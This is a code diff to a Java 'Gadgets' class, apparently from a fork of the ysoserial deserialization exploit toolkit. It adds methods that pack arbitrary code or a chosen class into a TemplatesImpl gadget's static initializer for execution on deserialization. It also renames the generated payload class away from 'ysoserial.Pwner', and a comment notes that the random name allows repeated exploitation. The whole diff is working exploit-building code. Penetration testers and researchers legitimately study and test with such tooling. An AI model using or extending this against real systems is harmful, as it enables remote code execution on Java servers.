@@ -89,6 +89,49 @@ public class Gadgets {
         return map;
     }
 
+    public static Object createTemplatesImplByCode(String code) throws Exception {
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+
+        ClassPool classPool = ClassPool.getDefault();
+        Class cls = Gadgets.StubTransletPayload.class;
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass clazz = classPool.get(cls.getName());
+        clazz.makeClassInitializer().insertAfter(code);
+        clazz.setName("mysocall.Moo" + System.nanoTime());
+        CtClass superC = classPool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superC);
+        final byte[] classBytes = clazz.toBytecode();
+
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class) });
+        Reflections.setFieldValue(templates, "_name", "aaaa");
+        Reflections.setFieldValue(templates, "_tfactory", TransformerFactoryImpl.class.newInstance());
+
+        return templates;
+    }
+
+
+    public static Object createTemplatesImplByClass(Class cls) throws Exception {
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass clazz = classPool.get(cls.getName());
+        clazz.setName("mysocall.Moo" + System.nanoTime());
+        CtClass superC = classPool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superC);
+        final byte[] classBytes = clazz.toBytecode();
+        classBytes[7] = 0x32;
+
+
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class) });
+        Reflections.setFieldValue(templates, "_name", "aaaa");
+        Reflections.setFieldValue(templates, "_tfactory", TransformerFactoryImpl.class.newInstance());
+
+        return templates;
+    }
+
 
     public static Object createTemplatesImpl ( final String command ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
@@ -119,7 +162,7 @@ public class Gadgets {
             "\");";
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        clazz.setName("mysocall.Moo" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
 
